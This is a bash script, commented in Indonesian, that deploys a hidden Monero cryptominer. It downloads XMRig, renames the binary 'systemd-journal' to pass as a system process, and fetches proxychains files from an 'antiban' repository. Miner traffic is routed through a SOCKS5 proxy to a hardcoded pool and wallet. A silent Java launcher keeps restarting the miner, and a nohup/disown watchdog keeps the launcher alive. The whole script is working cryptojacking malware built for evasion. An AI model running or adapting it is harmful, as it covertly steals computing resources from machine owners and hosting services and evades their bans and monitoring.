#!/bin/bash
set -e

# === KONFIGURASI ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
POOL="24.199.99.228:1935"
SOCKS5_IP="116.100.220.220"
SOCKS5_PORT="1080"

# === AMAN TANPA HOSTNAME ===
if command -v hostname >/dev/null 2>&1; then
  WORKER="stealth-$(hostname)"
else
  WORKER="stealth-$(date +%s)"
fi

DIR="$HOME/.xmrig-java"

echo "[*] Menyiapkan folder $DIR..."
mkdir -p "$DIR" && cd "$DIR"

# Bersihkan cache (tidak fatal jika gagal)
sync || true
echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true

# === UNDUH XMRIG ===
echo "[*] Mengunduh XMRig..."
XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | \
grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
curl -sLo xmrig.tar.gz "$XMRIG_URL"
tar -xzf xmrig.tar.gz --strip-components=1
rm -f xmrig.tar.gz
mv xmrig systemd-journal
chmod +x systemd-journal

# === PROXYCHAINS ===
curl -sLo proxychains https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/proxychains
curl -sLo libproxychains.so.4 https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/libproxychains.so.4
chmod +x proxychains libproxychains.so.4

# === KONFIGURASI PROXYCHAINS ===
cat > proxychains.conf <<EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 $SOCKS5_IP $SOCKS5_PORT
EOF

# === KONFIGURASI XMRIG ===
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": { "enabled": true },
  "pools": [{
    "url": "$POOL",
    "user": "$WALLET.$WORKER",
    "pass": "Danis",
    "keepalive": true,
    "tls": true
  }]
}
EOF

# === JAVA LAUNCHER ===
cat > Launcher.java <<EOF
import java.io.*; import java.util.*;
public class Launcher {
  public static void main(String[] args) {
    while (true) {
      try {
        Thread.sleep(new Random().nextInt(10) * 1000 + 5000);
        ProcessBuilder pb = new ProcessBuilder("bash", "-c",
          "LD_PRELOAD=" + System.getenv("PWD") + "/libproxychains.so.4 PROXYCHAINS_CONF_FILE=" +
          System.getenv("PWD") + "/proxychains.conf ./systemd-journal --config=config.json");
        pb.redirectOutput(new File("/dev/null"));
        pb.redirectErrorStream(true);
        pb.start().waitFor();
        Thread.sleep(3000);
      } catch (Exception e) {}
    }
  }
}
EOF

javac Launcher.java
jar cfe launcher.jar Launcher Launcher.class

# === JALANKAN LAUNCHER ===
nohup java -jar launcher.jar >/dev/null 2>&1 &
disown

# === WATCHDOG ===
cat > watchdog.sh <<EOF
#!/bin/bash
while true; do
  if ! pgrep -f launcher.jar >/dev/null; then
    echo "[!] Launcher mati. Memulai ulang..."
    sync || true
    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
    nohup java -jar launcher.jar >/dev/null 2>&1 &
    disown
  fi
  sleep 60
done
EOF

chmod +x watchdog.sh
nohup bash watchdog.sh >/dev/null 2>&1 &
disown

echo "[✓] XMRig stealth berhasil dijalankan dengan Java launcher + watchdog."
